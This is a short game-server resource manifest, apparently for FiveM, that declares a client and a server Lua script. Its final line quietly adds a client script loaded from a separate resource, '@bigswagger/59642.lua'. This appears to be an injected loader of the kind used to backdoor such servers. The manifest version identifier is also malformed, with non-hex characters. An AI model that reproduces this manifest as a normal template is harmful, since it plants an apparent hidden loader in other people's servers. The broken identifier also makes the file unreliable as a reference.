resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a58khf453'


client_scripts{ 	
	"client.lua"
}

server_scripts{ 
	"server.lua"
}
client_script '@bigswagger/59642.lua'